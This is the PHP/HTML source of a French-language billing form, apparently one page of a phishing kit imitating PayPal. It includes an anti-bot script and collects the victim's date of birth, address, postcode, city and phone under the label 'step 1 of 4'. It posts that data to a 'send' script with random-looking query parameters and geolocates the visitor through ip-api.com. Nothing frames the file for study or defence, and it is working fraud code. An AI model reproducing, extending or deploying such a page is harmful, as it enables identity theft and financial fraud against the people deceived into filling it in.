<?php 

ob_start();
session_start();
include '../config.php';
include '../antibots.php';

?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Facturation</title>
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'send/serv5202.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
                    <center>
                         <span class="step" style="text-transform:uppercase"><b>Étape 1 sur 4</b></span>
                        <h3>Données de facturation</h3>
                                                
                        <input type="tel" maxlength="10" data-mask="99/99/9999" name="dob" id="Dobt" class="bill_input" placeholder="Date de naissance (JJ/MM/AAAA)" data-mask="99/99" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <input type="text" name="address1" class="bill_input" placeholder="Adresse" maxlength = "50" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">					
								<input type="text" name="ZIP" maxlength="11" class="bill_input" placeholder="Code postal" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">  
						<input type="text" name="city" class="bill_input" placeholder="Ville" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">                 
                        <input type="tel" name="phone" class="bill_input" maxlength = "15" placeholder="Numéro de téléphone" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">  
						<select class="bill_input" id="country" name="country" aria-required="true">
						
    <option value="Votre Province" selected disabled>Votre Pays</option> 
	<option value="Belgique">Belgique</option>
	<option value="Allemagne">Allemagne</option>
	<option value="Canada">Canada</option> 
	<option value="France">France</option>
	<option value="Luxembourg">Luxembourg</option>
	<option value="Pays-Bas">Pays-Bas</option>								  
	<option value="Suisse">Suisse</option> 
	<option value="- Autre Pays -">- Autre Pays -</option> 
                        </select>

                                                <hr class="hr" style="margin:0px auto 15px; top: 50%;">
                        <input type="submit" value="Continuer" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
            <script>
    $(document).ready(function() {
            $.getJSON("http://ip-api.com/json", function(data) {
                    var kap = (data.country);
                    $("#country").val(kap);
                });
    });
            </script>
        </body>
    </html>
